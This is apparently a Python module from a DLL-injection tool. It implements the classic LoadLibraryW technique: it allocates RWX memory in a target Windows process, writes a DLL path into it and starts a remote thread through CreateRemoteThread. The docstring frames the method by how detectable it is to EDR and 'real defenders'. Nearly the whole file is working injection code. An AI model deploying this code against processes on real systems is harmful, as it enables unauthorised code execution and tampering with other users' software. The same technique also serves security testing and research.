"""Classic LoadLibraryW injection via CreateRemoteThread.

Steps:
    1. VirtualAllocEx RWX in the target for the DLL path string.
    2. WriteProcessMemory the wide-char path.
    3. Resolve kernel32!LoadLibraryW in OUR process (same module base in
       every process on modern Windows — ASLR is per-boot, not per-process
       for system DLLs).
    4. CreateRemoteThread with the resolved address.
    5. WaitForSingleObject, ReadProcessMemory the thread's exit code.
       Non-zero exit code == HMODULE of the loaded DLL == success.

Noisiest method. Every EDR on the planet watches for this exact pattern.
Use it for local testing, not for anything that needs to survive contact
with a real defender.
"""
from __future__ import annotations

import ctypes
import logging
from ctypes import wintypes
from pathlib import Path

from dll_injector.processors.base import InjectionMethod, InjectionOutcome
from dll_injector.utils import winapi

log = logging.getLogger(__name__)

_PAGE_RWX = 0x40
_MEM_COMMIT = 0x1000
_MEM_RESERVE = 0x2000
_MEM_RELEASE = 0x8000
_INFINITE = 0xFFFFFFFF


class LoadLibraryMethod(InjectionMethod):
    name = "loadlibrary"
    requires_admin = False

    def inject(self, handle: winapi.ProcessHandle, dll_path: Path, dll_bytes: bytes) -> InjectionOutcome:
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        kernel32.LoadLibraryW.restype = wintypes.HMODULE
        loadlib_addr = ctypes.cast(kernel32.LoadLibraryW, ctypes.c_void_p).value
        if loadlib_addr is None:
            raise OSError("could not resolve LoadLibraryW")

        path_w = str(dll_path).encode("utf-16-le") + b"\x00\x00"
        remote_buf = winapi.virtual_alloc_ex(
            handle, 0, len(path_w), _MEM_COMMIT | _MEM_RESERVE, _PAGE_RWX
        )
        if not remote_buf:
            raise OSError(f"VirtualAllocEx failed: {ctypes.get_last_error()}")

        try:
            winapi.write_process_memory(handle, remote_buf, path_w)
            log.debug("loadlibrary: wrote %d bytes at 0x%08x", len(path_w), remote_buf)

            thread = winapi.create_remote_thread(handle, loadlib_addr, remote_buf)
            winapi.wait_for_single_object(thread, 8000)
            exit_code = winapi.get_exit_code_thread(thread)
            winapi.close_handle(thread)

            if exit_code == 0:
                return InjectionOutcome(
                    method=self.name, success=False,
                    detail="LoadLibraryW returned NULL in target",
                )
            return InjectionOutcome(
                method=self.name, success=True,
                detail=f"LoadLibraryW returned HMODULE 0x{exit_code:08x}",
                remote_base=exit_code,
            )
        finally:
            winapi.virtual_free_ex(handle, remote_buf, 0, _MEM_RELEASE)